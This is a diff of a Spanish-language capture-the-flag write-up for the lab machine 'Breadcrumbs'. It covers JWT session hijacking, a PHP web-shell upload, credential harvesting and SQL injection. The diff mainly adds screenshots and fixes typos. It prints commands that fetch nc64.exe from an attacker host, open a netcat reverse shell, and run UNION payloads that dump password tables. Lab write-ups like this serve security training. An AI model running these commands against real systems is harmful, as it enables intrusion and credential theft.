@@ -150,53 +150,68 @@ _breadcrumbs_
 
 El archivo cookie.php se encarga de crear `PHPSESSID` de nuestra session, toma nuestro username y con key crea un valor aleatorio.
 
-
-
+![imagen-de-prueba](/assets/img/breadcrumbs/codigocookie.png)
+_breadcrumbs_
 
 Probemos el archivo con un print al final del codigo para ver los resultados de la funcion y comprovar si es aleatorio.
 
-
-
+![imagen-de-prueba](/assets/img/breadcrumbs/pruebadecookie.png)
+_breadcrumbs_
 
 Ejecutamos un bucle con el archivo, y vemos que nos crea `PHPSESSID` que tenemos actualemnte en la seccion.
 
+![imagen-de-prueba](/assets/img/breadcrumbs/norandon.png)
+_breadcrumbs_
 
 En este punto ya tenemos una forma de crear `PHPSESSID` , fata encontrar la calve secreta para crear el JWT.
 
 Seguiremos aplicando wfuzz en la ruta `portal` econtramos otra ruta llamada `includes` vamos a ver si contiene archivos php.
 
-
-
+![imagen-de-prueba](/assets/img/breadcrumbs/fuzz3.png)
+_breadcrumbs_
 
 Probemos con burpsuit para ver el contenido de los .php
 miremos el archivo `fileController.php` 
 
+![imagen-de-prueba](/assets/img/breadcrumbs/secreckey.png)
+_breadcrumbs_
 
 `fileController.php` contiene la clave secreta para el JWT y mas bajo vemos el mensaje de `privilegios insuficientes`, ya con esto podemos crear el un JWT y secuetrar la session de `paul` que es un usuario administrador `activo`.
+
+![imagen-de-prueba](/assets/img/breadcrumbs/clave.png)
+_breadcrumbs_
 
 # Cookie Hijacking
 Teniendo el token de el usuario `test` el cookie.php para generar `PHPSESSID` y la clave secreta, vamos a secuestrar la sesion de `paul` vamos a https://jwt.io 
 
+![imagen-de-prueba](/assets/img/breadcrumbs/token2.png)
+_breadcrumbs_
 
+![imagen-de-prueba](/assets/img/breadcrumbs/token3.png)
+_breadcrumbs_
 
 Copiamos el JWT y el `PHPSESSID` en el navegador y recargamos la pagina.
 
+![imagen-de-prueba](/assets/img/breadcrumbs/paul1.png)
+_breadcrumbs_
 
-
-
-
-
-
-
+![imagen-de-prueba](/assets/img/breadcrumbs/paul2.png)
+_breadcrumbs_
 
 Ahora estamos como el usuario `paul`, lo primero que voy hacer es intentar subir un archivo que me permita ejecutar comandos, pero antes miremos la peticion con burpsuit.
 
+![imagen-de-prueba](/assets/img/breadcrumbs/paul3.png)
+_breadcrumbs_
 
 Vemos que al subir el archivo me cambia la extencion `php` a `zip` enviamos la peticion al repeater, cambiamos el archivo a php.
 
+![imagen-de-prueba](/assets/img/breadcrumbs/paul4.png)
+_breadcrumbs_
 
 Verificamos que si subimos el archivo en al ruta `/portal/uploads` 
 
+![imagen-de-prueba](/assets/img/breadcrumbs/upload.png)
+_breadcrumbs_
 
 El archivo ya esta en la maquina victima. vamos a probar un comando.
 
@@ -204,7 +219,8 @@ El archivo ya esta en la maquina victima. vamos a probar un comando.
 >http://10.10.10.228/portal/uploads/prueba.php?cmd=ipconfig
 `````
 
-
+![imagen-de-prueba](/assets/img/breadcrumbs/ping.png)
+_breadcrumbs_
 
 Tenemos ejecucion de comandos.
 
@@ -214,42 +230,59 @@ Vamos a subir `nc64.exe` a la maquina victima para establecer una revershell.
 ````bash
 >http://10.10.10.228/portal/uploads/prueba.php?cmd=powershell.exe wget http://10.10.14.7:8000/nc64.exe -O C:\Windows\Temp\nc64.exe
 `````
+![imagen-de-prueba](/assets/img/breadcrumbs/shell1.png)
+_breadcrumbs_
 
 Ahora ejecutamo el binario.
 
 ````bash
 >http://10.10.10.228/portal/uploads/prueba.php?cmd=cmd.exe /c C:\Windows\Temp\nc64.exe -e cmd 10.10.14.7 443
 `````
+![imagen-de-prueba](/assets/img/breadcrumbs/shell2.png)
+_breadcrumbs_
 
 Estamos dentro de la maquina con el ususario `www-data` , enumerando el usuario vemos que no tiene privilegios como `SeImpersonatePrivilege` 
 
+![imagen-de-prueba](/assets/img/breadcrumbs/whoami1.png)
+_breadcrumbs_
 
 Buscando en los directorios encuentro uno llamado `pizzaDeliveryUserData` que me llama la atecnion veamos que contiene.
 
-
+![imagen-de-prueba](/assets/img/breadcrumbs/pizza.png)
+_breadcrumbs_
 
 Dentro hay archivos con nombres de ususarios y uno llamado `juliette.json` , si le hago un type al archivo vemos que contiene un username:`juliette` y un password.
 
+![imagen-de-prueba](/assets/img/breadcrumbs/type1.png)
+_breadcrumbs_
+
 Si miramos de nuevo el scanport del nmap vemos que la maquina tiene el puerto 22 abierto, probemos las credenciales que tenemos de `juliette` con `ssh`
 
+![imagen-de-prueba](/assets/img/breadcrumbs/scan1.png)
+_breadcrumbs_
 
 Son validas las credenciales para ssh, vamos a enumerar el usuario para ver si tenemos un camino para escalar privilegios.
 
+![imagen-de-prueba](/assets/img/breadcrumbs/ssh1.png)
+_breadcrumbs_
 
 En la raiz del sistema existe un directorio llamado `Development` pero no tenemos acceso.
 
+![imagen-de-prueba](/assets/img/breadcrumbs/dev1.png)
+_breadcrumbs_
 
-Me llama mucho la atencion el el directorio asi que buscare una forma de cambiame al usuario `development` , en el Desktop de juliette existe un archivo llamado `todo.html` 
+Me llama mucho la atencion el el directorio asi que buscare una forma de cambiar al usuario `development` , en el Desktop de juliette existe un archivo llamado `todo.html` 
 
-
-
+![imagen-de-prueba](/assets/img/breadcrumbs/todo1.png)
+_breadcrumbs_
 
 Dentro hay un mensaje que dice `Migre las contraseñas de la aplicacion Sticky Notes a nuestro nuevo administrador de contraseñas` 
 
-
-
 Con esta informacion buscando en google `sticky note path` o `sticky note backup` , tenemos una ruta donde se almacena un archivo `.sqlite`
 `C:\Users\Username\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState`
+
+![imagen-de-prueba](/assets/img/breadcrumbs/sti1.png)
+_breadcrumbs_
 
 La ruta existe en esta maquina y dentro esta el archivo `.sqlite` .
 
@@ -261,23 +294,36 @@ Voy a descargarlo a mi maquina para analizarlo en local con `smbserver`.
 
 En local ejecuto un `strings` al archivo y encuentro unas credenciales para el usuarion `development` .
 
+![imagen-de-prueba](/assets/img/breadcrumbs/dev2.png)
+_breadcrumbs_
 
-Compruebo si las credenciales son valias y usare ssh de nuevo 
+Compruebo si las credenciales son valias y usare ssh de nuevo.
 
-
+![imagen-de-prueba](/assets/img/breadcrumbs/dev4.png)
+_breadcrumbs_
 
 Son validas, como vimos antes teniamos un directorio llamdo `Development` en la raiz del sistema.
 
+![imagen-de-prueba](/assets/img/breadcrumbs/dev5.png)
+_breadcrumbs_
 
 Dentro del directorio hay un archivo llamado `Krypter_Linux` voy a descargarlo para analizarlo en local nuevamente con smbserver.
 
+![imagen-de-prueba](/assets/img/breadcrumbs/dev6.png)
+_breadcrumbs_
 
 El archivo esta copilado en linux si lo ejecutamos vemos algo de informcaion.
 
-
+![imagen-de-prueba](/assets/img/breadcrumbs/dev7.png)
+_breadcrumbs_
 
 Si le ejecuto un  `strings` ecuentro una `url` que apunta aun puero `1234` que no esta expuesto, pero si miramos dentro de la maquina con `netstat -nat` vemos que si esta.
 
+![imagen-de-prueba](/assets/img/breadcrumbs/url1.png)
+_breadcrumbs_
+
+![imagen-de-prueba](/assets/img/breadcrumbs/port3.png)
+_breadcrumbs_
 
 Voy hacer un `local port forwarding` con ssh para analizar la url pero desde mi maquina.
 
@@ -287,8 +333,13 @@ Voy hacer un `local port forwarding` con ssh para analizar la url pero desde mi 
 
 En el navegador vamos al `localhots:1234` y vemos un `Bad Request` , si usamos el method que econtramos nos damos cuenta de que es una base de datos.
 
+![imagen-de-prueba](/assets/img/breadcrumbs/url2.png)
+_breadcrumbs_
 
 Vemos una `aes_key` una clave encriptada pero no sabemos de que.
+
+![imagen-de-prueba](/assets/img/breadcrumbs/url4.png)
+_breadcrumbs_
 
 ## Inyeccion SQL 
 
@@ -297,6 +348,8 @@ Investigando vi que la base de datos solo tiene una columna.
 ````bash
 >order by 1-- -
 `````
+![imagen-de-prueba](/assets/img/breadcrumbs/sql1.png)
+_breadcrumbs_
 
 Veamos el nombre de la base de datos.
 
@@ -304,11 +357,17 @@ Veamos el nombre de la base de datos.
 >union select database()-- -
 `````
 
+![imagen-de-prueba](/assets/img/breadcrumbs/sql2.png)
+_breadcrumbs_
+
 Enumeremos las tablas de `bread`.
 
 ````bash
 >union select table_name from information_schema.tables where table_schema="bread"-- -
 `````
+
+![imagen-de-prueba](/assets/img/breadcrumbs/sql3.png)
+_breadcrumbs_
 
 Tenemos la tabla `password` miremos las columnas.
 
@@ -323,10 +382,17 @@ veamos el contenido de `account y password`.
 #0x3a son dos puntos (:) en hexadecimal
 `````
 
+![imagen-de-prueba](/assets/img/breadcrumbs/sql4.png)
+_breadcrumbs_
 
 Tenemos las credenciales de `Administrador` pero en `base64`. en la pagina de `cyberchef` vamos a desencriptar las contraseña ya que tenemos la `aes.key` y la clave en `base64`
 
+![imagen-de-prueba](/assets/img/breadcrumbs/base64.png)
+_breadcrumbs_
+
 Ahora tenemos la contraseña en texto plano, verificamos con crackmapexec o ssh.
 
+![imagen-de-prueba](/assets/img/breadcrumbs/pwned1.png)
+_breadcrumbs_
 
 Tenemos pwned!!!!
